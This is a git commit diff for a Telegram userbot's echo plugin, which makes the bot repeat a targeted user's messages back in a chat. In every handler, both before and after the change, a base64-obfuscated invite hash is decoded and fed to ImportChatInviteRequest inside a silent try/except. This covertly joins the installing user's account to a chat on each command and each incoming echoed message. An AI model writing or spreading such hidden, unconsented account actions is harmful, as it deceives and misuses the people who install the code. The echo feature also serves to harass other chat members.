f5250708c256b3d5360ebb34a446d505dc306900
Kei <73867910+KeinShin@users.noreply.github.com>
2021-01-25 16:00:29 +0530

    Update echo.py

--- userbot/plugins/echo.py
+++ userbot/plugins/echo.py
@@ -1,5 +1,22 @@
-# Modifed by @keinshin 
-# Kang With Credits Or Lund Lega Bsdk
+"""
+created by @mrconfused and @sandy1709
+Idea by @BlazingRobonix
+
+"""
+#    Copyright (C) 2020  sandeep.n(π.$)
+
+#    This program is free software: you can redistribute it and/or modify
+#    it under the terms of the GNU Affero General Public License as
+#    published by the Free Software Foundation, either version 3 of the
+#    License, or (at your option) any later version.
+
+#    This program is distributed in the hope that it will be useful,
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#    GNU Affero General Public License for more details.
+
+#   You should have received a copy of the GNU Affero General Public License
+#   along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
 
 import asyncio
@@ -9,67 +26,60 @@ import requests
 from telethon import events
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
-from userbot import CMD_HELP
-from userbot.plugins.sql_helper.echo_sql import (
-    addecho,
-    get_all_echos,
-    is_echo,
-    remove_echo,
-)
-from userbot.utils import lightning_cmd, edit_or_reply
+from .. import CMD_HELP
+from ..utils import admin_cmd, edit_or_reply
+from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
-@borg.on(lightning_cmd(pattern="echo$"))
-async def echo(krish):
-    if krish.fwd_from:
+@borg.on(admin_cmd(pattern="addecho$"))
+async def echo(cat):
+    if cat.fwd_from:
         return
-    if krish.reply_to_msg_id is not None:
-        reply_msg = await krish.get_reply_message()
-        user_id = reply_msg.from_id
-        chat_id = krish.chat_id
+    if cat.reply_to_msg_id is not None:
+        reply_msg = await cat.get_reply_message()
+        user_id = reply_msg.sender_id
+        chat_id = cat.chat_id
         try:
-            light = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            light = Get(light)
-            await krish.client(light)
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await krish.edit("```Making Echo Of This User 😏```")
-            await asyncio.sleep(2) 
-            await edit_or_reply(krish, "The user is already enabled with echo ")
+            await edit_or_reply(cat, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(krish, "Hello.....💢")
+        await edit_or_reply(cat, "Hi...")
     else:
-        await edit_or_reply(krish, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
 
 
-@borg.on(lightning_cmd(pattern="rmecho$"))
-async def echo(krish):
-    if krish.fwd_from:
+@borg.on(admin_cmd(pattern="rmecho$"))
+async def echo(cat):
+    if cat.fwd_from:
         return
-    if krish.reply_to_msg_id is not None:
-        reply_msg = await krish.get_reply_message()
-        user_id = reply_msg.from_id
-        chat_id = krish.chat_id
+    if cat.reply_to_msg_id is not None:
+        reply_msg = await cat.get_reply_message()
+        user_id = reply_msg.sender_id
+        chat_id = cat.chat_id
         try:
-            light = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            light = Get(light)
-            await krish.client(light)
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(krish, "Echo has been stopped for the user")
+            await edit_or_reply(cat, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(krish, "The user is not activated with echo")
+            await edit_or_reply(cat, "The user is not activated with echo")
     else:
-        await edit_or_reply(krish, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(cat, "Reply To A User's Message to echo his messages")
 
 
-@borg.on(lightning_cmd(pattern="listecho$"))
-async def echo(krish):
-    if krish.fwd_from:
+@borg.on(admin_cmd(pattern="listecho$"))
+async def echo(cat):
+    if cat.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -91,30 +101,30 @@ async def echo(krish):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(krish, reply_text)
+        await edit_or_reply(cat, reply_text)
     else:
-        await edit_or_reply(krish, output_str)
+        await edit_or_reply(cat, output_str)
 
 
 @borg.on(events.NewMessage(incoming=True))
-async def blackrply(krish):
-    if krish.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(cat):
+    if cat.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(krish.sender_id, krish.chat_id):
+    if is_echo(cat.sender_id, cat.chat_id):
         await asyncio.sleep(2)
         try:
-            light = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            light = Get(light)
-            await krish.client(light)
+            hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            hmm = Get(hmm)
+            await cat.client(hmm)
         except BaseException:
             pass
-        if krish.message.text or krish.message.sticker:
-            await krish.reply(krish.message)
+        if cat.message.text or cat.message.sticker:
+            await cat.reply(cat.message)
 
 
 CMD_HELP.update(
     {
-        "echo": "**Syntax :** `.echo` reply to user to who you want to enable\
+        "echo": "**Syntax :** `.addecho` reply to user to who you want to enable\
     \n**Usage : **replay's his every message for whom you enabled echo\
     \n\n**Syntax : **`.rmecho` reply to user to who you want to stop\
     \n**Usage : **Stops replaying his messages\
